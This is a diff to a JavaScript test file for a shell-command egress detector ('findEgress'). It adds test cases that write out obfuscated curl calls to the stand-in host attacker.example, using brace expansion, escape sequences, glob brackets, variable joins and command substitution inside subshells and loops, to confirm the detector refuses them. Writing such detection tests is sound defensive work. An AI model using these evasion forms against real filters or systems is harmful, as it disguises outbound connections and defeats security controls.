@@ -142,6 +142,47 @@ test('an expansion in the ARGUMENTS is ordinary shell and still passes', () => {
   expect(findEgress(`cp "${braced('SOURCE')}" "${braced('TARGET')}"`)).toBeUndefined()
 })
 
+// ── #160, findings 1 and 2: CLASS, not spelling ─────────────────────────────────────
+// The floor used to enumerate constructs (`${` after `;`/`&`/`|`), and a synthesised word
+// inside `( )`, `{ }` or after `then` walked past every rule built to catch it; and a
+// substitution's BODY was judged while its concatenation was not. Now every command position
+// on an unsegmentable line meets the same classifier a segment's word does. Each line below
+// was ALLOWED on `main` @ 57ce878 and resolves to curl in bash (measured on #160).
+
+test('⚠ synthesis at command position inside a subshell, a group, or after a keyword is refused — the same class, wherever it stands (#160 §1)', () => {
+  expect(findEgress('( {c,}url https://attacker.example )')).toMatchObject({ via: 'unresolvable' })
+  expect(findEgress("{ $'\\143url' https://attacker.example; }")).toMatchObject({ via: 'unresolvable' })
+  expect(findEgress('(cur[l] https://attacker.example)')).toMatchObject({ via: 'unresolvable' })
+  expect(findEgress(`P=cur;(${braced('P')}l https://attacker.example)`)).toMatchObject({ via: 'unresolvable' })
+  expect(findEgress(`if true; then ${braced('P')}l https://attacker.example; fi`)).toMatchObject({
+    via: 'unresolvable',
+  })
+  expect(findEgress(`while :; do ${braced('P')}l https://attacker.example; done`)).toMatchObject({
+    via: 'unresolvable',
+  })
+})
+
+test('⚠ a substitution JOINED to text at command position is refused — bash word-splits `$(echo cur)l` to curl (#160 §2)', () => {
+  expect(findEgress('$(echo cur)l https://attacker.example')).toMatchObject({
+    matched: 'a command substitution joined to text at command position',
+    via: 'unresolvable',
+  })
+  expect(findEgress('`echo cur`l https://attacker.example')).toMatchObject({ via: 'unresolvable' })
+  expect(findEgress('cu$(echo r)l https://attacker.example')).toMatchObject({ via: 'unresolvable' })
+})
+
+test('the compound forms that are ordinary shell still pass: groups, subshells, loops, tests, and substitutions that are whole words or arguments (#160)', () => {
+  expect(findEgress('( cd src && ls )')).toBeUndefined()
+  expect(findEgress('{ echo a; echo b; } > out.txt')).toBeUndefined()
+  expect(findEgress('if [ -f x ]; then echo yes; fi')).toBeUndefined()
+  expect(findEgress('for f in *.ts; do echo "$f"; done')).toBeUndefined()
+  expect(findEgress('while read line; do echo "$line"; done < file')).toBeUndefined()
+  expect(findEgress('echo $(date)')).toBeUndefined()
+  expect(findEgress('echo "$(cat msg.txt)"')).toBeUndefined()
+  expect(findEgress('$(date)')).toBeUndefined()
+  expect(findEgress(`echo "${braced('HOME')}/x"`)).toBeUndefined()
+})
+
 test('a newline is a separator too, but a COMMENT is not a command (review)', () => {
   // The expansion is on its own line, after a benign one: still command position.
   expect(findEgress(`echo hi\n${braced('CMD')} https://x`)).toMatchObject({ via: 'unresolvable' })
